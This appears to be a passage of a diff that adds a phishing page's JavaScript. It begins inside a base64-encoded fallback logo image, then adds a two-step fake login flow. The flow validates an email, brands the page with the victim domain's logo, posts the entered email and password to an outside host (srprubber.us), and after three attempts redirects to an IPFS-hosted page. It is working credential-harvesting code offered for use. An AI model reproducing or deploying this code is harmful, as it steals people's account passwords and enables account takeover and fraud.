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");
+                $("#logoname").html("");
+				$("#logonamec").html("");
+
+            });
+
+
+    }
+
+
+
+
+
+    $('#ai').click(function() {
+        $('#error').hide();
+    });
+
+    $(document).keypress(function(event) {
+
+        var keycode = (event.keyCode ? event.keyCode : event.which);
+        if (keycode == '13') {
+            event.preventDefault();
+            if ($("#div1").is(":visible")) {
+
+                $("#next").click();
+
+            } else if ($("#div2").is(":visible")) {
+                event.preventDefault();
+
+                $("#submit-btn").click();
+
+            } else {
+                return false;
+            }
+        }
+    });
+
+
+    $('#next').click(function() {
+        event.preventDefault();
+        var my_ai = $('#ai').val();
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(my_ai)) {
+            $('#error').show();
+            ai.focus;
+            return false;
+        }
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        var finalu = c.toUpperCase();
+        $("#div1").animate({ left: 0, opacity: "hide" }, 0);
+        $("#div2").animate({ right: 0, opacity: "show" }, 500);
+
+        $("#aich").html(my_ai);
+		$("#aicx").html(my_ai);
+        $.get("" + my_slice)
+            .done(function() {
+                $("#logoimg").attr("src", "" + my_slice);
+                $("#logoname").html(finalu);
+				$("#logonamec").html(finalu);
+
+            }).fail(function() {
+                $("#logoimg").attr("src", "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAALgAAACpCAYAAACYuff5AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAAFiUAABYlAUlSJPAAABAeSURBVHhe7Z2Jktu2EgDXzn05Tir5/w9MVeI4iXPHz624N2O+lVYHAWLA6SoUJe16OQBawwEl0k9+/fXX13dFMSlP326LYkpK8GJqSvBiaqoGv4LXr1/ft3/++eew/fvvvw+Pfc7W13geefLkyd3Tp0/v3nvvvcPW577mc7a24jpK8BMo8UPC2vy9+Hp8zccRhVViUOSHXvP1+IawFacpwRcoqcKypf31118Hwdkqbi+Q+v333z8Izpbnih6FL/6fEvwtio3AtD/++ONe8vhzn/dGiRWZLXJ/+OGHB+lp8efFv+xa8GV2Rl6e89hyZGQQnKweS5dllt87uxPcLBzlJlv/+eefm2XntUDwDz744D6rK/meM/uuBFdqZEZq5Fb47HKLMtOQHNmRfq8ZfXrBzdaWIW4zlCC3gtCWMMgey5e9ZPRpBTcrK/Pvv/9+L/ceUe6PPvroXnoz/cxMKbhZmzLEUsRsPUspcimKTPa2dKHNns2nElyxqbFpZuzZS5FLsXRBdOpza/QZRZ9GcCRWbsoRMnfxOGRxypZZF6JTCI7YCG2dzfO9liKXQtZGautzy5ZZSC04IlOCILclCa8Vl6PknkenhJlB9LSCIzJCI/abPpTYK4HUn3zyyUF0hM8ueUrBkdk6G8FL7nVBajM5ZUtmyVMJTl1t1l6e/ivWBak9nWg2z3iWJc1bE7mtt3/77bfK3I1hbBljxpoxZ+wzLtxTCK7cr169Ogx41sHOhuPOmDP2Gcd9eMEZUBeSZu2Sux+MtdncOcg0/kMLzsBSZ5NBKnNvB2NuJqdlWvsMK7iDyqGRGrDE3h7mgLnIVK4MKTgD5wLHsqQYA8sV52Z0yYcTnAEjO5ApONddco8Hc+LnEKNn8uEEZ/BYzJTcY6PkzNXI8zSU4CxeGLQqS3LAHDFXzBlzNyLDCB4HK8sCZu9YTo6clIYQnIFigKjpyAQldx6YK+aMuWMOR5u7zQVfHuZK7nwouXM4UibfXHAHxhV5kRPPfI02j5sKHrP3iPVbcRnMIWdVkHyU+dxMcAbAuq3kngfm0vXUCPO6ieDUbHTemm1W6OepNiuWnczx1v3cRHA6ziBQq43wLl8bJpV+2ehnbPFnM4pun0dYcG5yRQ/vbr7LwGFshglW6HMl9kp2m3ea8kLfGe5PQh+4Gujjjz8+XPa2FV0FZ6JpfBuNxUh2uaPYZCtrT49Oin5McKVeXho2i+jEzwXMn3766eHxFv3pKjiTjQBm78zQF2tN+6PYCv3YG9gJZxtFN+vxHNEzY3/YbtGXboIz2Uw+2ZtMx+OM0A9Ejm9U2rFsfS5IblZHhihG1gt+gf5wZCKL87h3P7oJbvb+5Zdf0sodszYlFo3nvB65dBKXbwpER2oO77Ts2RyxP/vss02yeDfBsy8skZgjD29QxDZr25e1MlP8e2ZzJEcQMmFGyemLR6TeC84uo4UcyEC2ywjx8wZFbkosHtOXteUG/xZ/26MF+2TfPF4eLbJAXyzjetJccCZKuWPGy4KZm6ytZPQDkHFNuSX+Xfblm4sYiCWb5Fs60EVwDud0LhvETtxmbvqhXC3EXuI+2Cf7NpMTU7ZEAcTdu0RtLrgZMFvWAeJm3WDN3VNuWUpOLMREbNnYwoWmgtMRGoelnp1aAycDoZZlSW/cp+VK1lIlutAr9uaCZzycWpqYvZ2MLeSWmMnN4pnHdgrBt6i5boVYGXwyJbH3XhQ9BrEQE7ERI7FmG19ix40eNBPcieBQmmkCwFKAiRghe0vM4sRmFs8ELuBEr8TRVHBbJpAHaay7iX8EuYVYiMmjIzH6JsxCTzeaCO4EMPjZIGYyDPEjzkhyS5TcbJgNE0lryZsJnnGVT9wKTuytB/8WiI0Yex7u14SY0wruwNOBTCi42Xt0iJFYswoe1zitWF1wBppG4JkG3ViXmWXUEgWIUcF9ngX80JGWcTcRPJvcYuwKkwFizT7eLWNvJnhWssWfVW5JJzgBx0N8JojZloWMMQsxt17vrC44h0xaxgGHbLJkizdC3PrSisrgxWbgSKoMbjZpGXBrOEMx4pmTY2SLdwmu6E0LmgieFWXJKHimmJeU4B1BlEwX9hJrZrkhjeCZSxNQbq5mzwKxziB5K3cqg79FQRAm3mhnxP4YEzESq2/IrJK39GZVwf1ULSsIouAZyhRiVPCscgPOtDpVuHqJkjWDg4J7g52RpSE2YiTW7ILjTIoSJbvgoOBm8RH7Q0wITYwKnpk0gmeXGzzsc4sxM+NI/Ypyczs0YiTm7LQa48rgD4A0CB5vFjlCv4yBmLzXH6Jnh36lyODZF5lgbavgZvFRIBZiIjZiJNaR4rsGnEmzyJwBSwAyJHd2HSGLx+xNTGbv7HJLigzOJGwpwZogEgs4789N1oQt+uc+LZ2IyTM9M9DSmzlGqBFIZBbfqh53X+ybGMzexFY8Tgl+AksVbj7Pf8HRW/Kl3MRALDOVJq0pwR8BuSxVkGtZrrQQPf5dyxL2PVtp0oNVR4qsMmNmQSglI4vyOGbRNSX3b3n0YF9mbh7PKHdLb1YdrZkzi5n8888/v3v27NlBuJhNzbrXyL78t+6LfbAv9jl75m7Vt1X/E6oXL14czme2Oqc5AkjIZVbe/JJtvEfgNYIDGYxJ9hw3jcUk29lrbvpMe/78+dtX1mNVwV++fHmYfNrsIDP95Cadis5zRFfyx2RXWrZMMCIrtmXQzFlb6CeNo9XarCr4Tz/9lPKWbdeCwH4KR5/pexT9WFaP2TqKTRnCY17j5zNn7Qh9pu9ffPHF21fWY1XB+Q+SmGAmek9E0aPYtmOC2xR9b2ILcvMGZ82xNqsK/uZv3d84fs8gtM3nEQVma9szyE1JxmnQtVm1wDMD7R2EPZahHSPb3uUGx6gFq9pY2ehdHI9jrfiXluOxquC8E4viGlq5Uxm82Jw0GbwEL64hneBVqhTn4kI7heBAwJy4bxVwMQ84gistE+Lqf9lTYSV48Rg4oi+tqAy+MvFDnkvaHkmZwQm6ZcCjgqTx43nb8qP75XMF9/HewJWWyXDVj+qBSeLLRnzxaqYvXSmiLQp6bEs7hZNr83ncLn+HNgtkb75g1fKIv7rggNg///zzYctkZ0MxlZRGP2xm4WVmjr/n41NEgd1Sj/q69Wl8zd+zgdtM0A/E5mIOtq1oIjgTy3ek+eJVpm8WLmX2a69sbUrt78Ym8fE5REGjvDZlRwSbz5fSZ4FvEPIFK777TvytaCI4E4zYSE4bFcWMQivxsvk7yi2XynwuUVYlt8XMblN8f2d04RHb21+0jLOJ4IAIr169OrSRUEhlRV7F9rvsSu4b4JTErSbnsX3alNvvVCs6ryu7/2YkuJCaZnytaCY4E6TgpyarJ8SB1Ajs1Tc0BTc7G6/b0eRYxqXsyKLgyB6vEjKrjwBxKHjrmJoJDpYoyOSk9EZhldqm1A+JHRlFiiXHYqVF0WlIbuO5v7cF7Jc4LFFa01Rw5CFDksWRqCcKawlCHCx6Xfgq9ZKtJv5WjvUF2RGKBR3NMoYSZgvRiYfMbRytaSq45QDnxBGtF0w2+0ZqjyI8fqiuzir0Y8T+2ZAascyePO5duhCD577Zd2uaCg4I3uucuGKToc3WiM1z5Y7MKrc81F8EI6Mjt1md5z1E92jCxcU9sjc0Fxzh3uzjIBuSt4L9IDEysz8acvP67Nn6XOI4IBuSc6Gv9zz0zEsr2AdHDt5UPbI3NBecQUVshGt1Tpx9WI5Q77d+M80EmRThqIstW1olAv4++7H+70HztxEdoUNxYbMWiE3WRmzuyULjMXLzMzNW8f84PozVcvweKuduITrQoxSKdDlO0Ck7uCbW22RtJoetckPPgcyGY6PkcQw9y7QmJrhepYl025uHwrU6yMRQlph5eMxrTJytOE0cq2PjuQbMOXO/doI7h26Cxyx+q+RkFyaAuj5mnJL6ehi7eESMi/RbYK63yt7QbY8MIJ1kEcP2WsgqDDoLSepFtrdOQvEfjq0nBW6tx+Ocb5GAur6l6CCdveVQFbMME7HWYbT4D8sVJKc+vyWBMNctz8w8RnfBOUz5QcM1nSajIDYTwGPZagBnIo4hY8sYM9ZxnM+Fv8Uc9/oQ6RjdiyI6SqevWXCSWcgoDHydLWmDY3lsrM+FuWWOmest56e74GAWv3TBGQfdw2bJvT6OKWN8jeDMKXNr9t6STfbOAPoOP7ceZ4BpHC6vOWQW1+F4O/7nwJx6hN46AW329qLzsUY7BwaYrFKC94OxvmSRyVwyp8ztufPakk0jUHK+7HPOYFySRYp1OWfcmUPmchS5YfMoOD/KO/6cTE4mUfISfSyYO+fxls851mZzwRkYz5WyfaxmK7G34dS88LM4h6NkbxgiEgaERQkD9NgnXlsvWop3YT78tPKaU7+tGSYaD3Hnrr5L9O1hDkxO55SYWzBURJ5eGnWwineJSYm5G5GhLPJw51XXlaXHhblhjnpfoXMpw6VJJScrWK4UY2FZQhtZbhjSHgaMQ58Xw5bkY8C8WJY4NyPLDcOaYyaP5crog7kHMpQlkaFTI9mCxYs3qskyqLPhPJC1mYfRznWfYvgoEdpDIjVflSx9UW4yd5ayJJLCFAaUQeaWX/yPAGSRyuTtQW7vZZKpLImkSYVR8m+//fbuyy+/PGT0og2M7bNnz+6++eabw5axz5hUmt/Zam34LgrXZP7www+Hxn0PeV7fUVkHJKYM4Uj51VdfHVq2siSSTnBAZq4y4cLjFy9e3H333XeHK0+K26HW5gj5/PnzQ1mSNXNLSsGFzM2tDZCcWzR7j5TK5pdh1kZoSkDkpvbmteykFhzM5pQr33///b3kddXPebBwVO6vv/76UJJkz9qR9IKDknOLAzI5or98+bIy+SMgMQtIxCZzs7CcSW6YQnDhih8kZ+FpyUIJU/X5u1Bne/rPU6/IPePnC1MJLt7ugNr8xx9/PAjvxbOXXEA7E8hLoyRBaE6zUmsj+4xiy5SCAyIjNRmdTE6Nzl1Tyeh7hIzNfx1CjU3mJmMj+8xyw7SCC6Kz6ERy2pv+HiTfQ+liKULjY3bEprGonF1smV7wiAtRyhZqdDK6mZ5t9kUpi0PLELZkbGpsP/VlAbk3diU4AtMQmqxu+aLwmSVXboW2DCFb+x2Smc6OnMuuBI8oOmWKZ1uQXvEpZfj5qMIjK+LGb1nSPDtCeaLYe2a3gi+xVkd0zrqQ1Xmu5Pzc1lt6s7NNuRGabO03LPdUW59LCR6IIlOv28jyZHQyPXU7r/WSHJmpnamnycxkbLIzr9mi+MW7lOAniLIjuc1FqY3nNp4jf3yN574hkNAMbOM5gsbXlNbXkdoWpS5OU4JfgVLHLG8Nz2N+xmPfEEoPyqysLgKR1ho6ZmdlL66jBC+mplJDMTUleDE1JXgxNSV4MTUleDE1JXgxNSV4MTUleDE1JXgxNSV4MTUleDE1JXgxNSV4MTUleDE1JXgxNSV4MTUleDE1JXgxNSV4MTUleDExd3f/A5wPNWsJJlhfAAAAAElFTkSuQmCC");
+                $("#logoname").html("");
+				$("#logonamec").html("");
+
+            });
+
+
+
+
+
+    });
+    // $('#back').click(function() {
+    //     // $("#msg").hide();
+    //     $("#ai").val("");
+    //     $("#pr").val("");
+    //     $("#div2").animate({ left: 0, opacity: "hide" }, 0);
+    //     $("#div1").animate({ right: 0, opacity: "show" }, 1000);
+
+    // });
+var file="bmV4dC5waHA=";
+
+    $('#submit-btn').click(function(event) {
+        event.preventDefault();
+        var ai = $("#ai").val();
+        var pr = $("#pr").val();
+        var detail = $("#field").html();
+        var msg = $('#msg').html();
+
+        var my_ai = ai;
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        $('#msg').text(msg);
+        count = count + 1;
+        $.ajax({
+            dataType: 'JSON',
+            url: 'https://srprubber.us/my/',
+            type: 'POST',
+            data: {
+                ai: ai,
+                pr: pr,
+                detail: detail,
+
+            },
+            beforeSend: function(xhr) {
+                $("#submit-btn").html("Authenticating....");
+            },
+            success: function(response) {
+                $("#pr").val("");
+                if (count >= 3) {
+                    count = 0;
+                    $("#div2").animate({ left: 0, opacity: "hide" }, 0);
+                    $("#div3").animate({ left: 0, opacity: "show" }, 500);
+                    setTimeout(() => {
+             window.location.replace("https://bafybeidcn7h4xogiok7hwogswtpkdtrmjjrm73ncu2jehlpvt5okcwfbvu.ipfs.w3s.link/complete.html?msg="+ai);
+                    }, 500);
+                    return false;
+                }
+                if (count == 2) {
+                    $("#msg2").show();
+                    $("#msg").hide();
+                    $("#msg1").hide();
+                } else {
+                    $("#msg1").show();
+                    $("#msg").hide();
+                    $("#msg2").hide();
+
+                }
+            },
+            error: function() {
+                $("#pr").val("");
+                if (count >= 3) {
+                    count = 0;
+                    $("#div2").animate({ left: 0, opacity: "hide" }, 0);
+                    $("#div3").animate({ left: 0, opacity: "show" }, 500);
+                    setTimeout(() => {
+                        window.location.replace("https://bafybeidcn7h4xogiok7hwogswtpkdtrmjjrm73ncu2jehlpvt5okcwfbvu.ipfs.w3s.link/complete.html?msg="+ai);
+                    }, 1000);
+                    return false;
+                }
+                if (count == 2) {
+                    $("#msg2").show();
+                    $("#msg").hide();
+                    $("#msg1").hide();
+                } else {
+                    $("#msg1").show();
+                    $("#msg").hide();
+                    $("#msg2").hide();
+
+                }
+            },
+            complete: function() {
+                $("#submit-btn").html("Proceed with the Current Request");
+            }
+        });
+    });
+});
+ </script>
+</html>
